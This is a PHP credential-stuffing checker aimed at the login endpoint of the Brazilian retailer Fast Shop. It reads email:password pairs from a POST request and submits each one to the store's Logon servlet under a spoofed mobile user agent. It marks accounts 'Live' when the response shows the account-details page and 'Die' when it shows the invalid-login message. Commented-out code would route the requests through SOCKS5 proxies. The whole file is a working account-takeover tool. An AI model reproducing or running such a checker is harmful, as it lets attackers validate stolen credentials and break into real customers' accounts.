<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://www.fastshop.com.br/webapp/wcs/stores/servlet/Logon?storeId=10151&hotsite=fastshop&catalogId=11052&reLogonURL=LogonForm&myAcctMain=1&fromOrderId=*&toOrderId=.&deleteIfEmpty=*&continue=1&createIfEmpty=1&calculationUsageId=-1&updatePrices=0&errorViewName=LogonForm&previousPage=logon&returnPage=&houseTypeRedirect=UserRegistrationForm&URL=OrderItemMove%3Fpage%3D%26URL%3DOrderCalculate%253FURL%253DAjaxLogonForm%26calculationUsageId%3D-1%26calculationUsageId%3D-2%26calculationUsageId%3D-7&logonId='.$email.'&logonPassword='.$pwd.'';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		
			 
			 if(stripos($curl->content, 'Informações Cadastrais') !== false){
			 	$result['error'] = 0;
				$result['msg'] = '<b style="color:yellow;">Live</b> => ' . $sock . ' | ' . $email .
                        ' | ' .$pwd.'| www.technologychecker.us'; 

			 }
			 elseif(stripos($curl->content, 'Login ou senha inválido') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Ckecked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>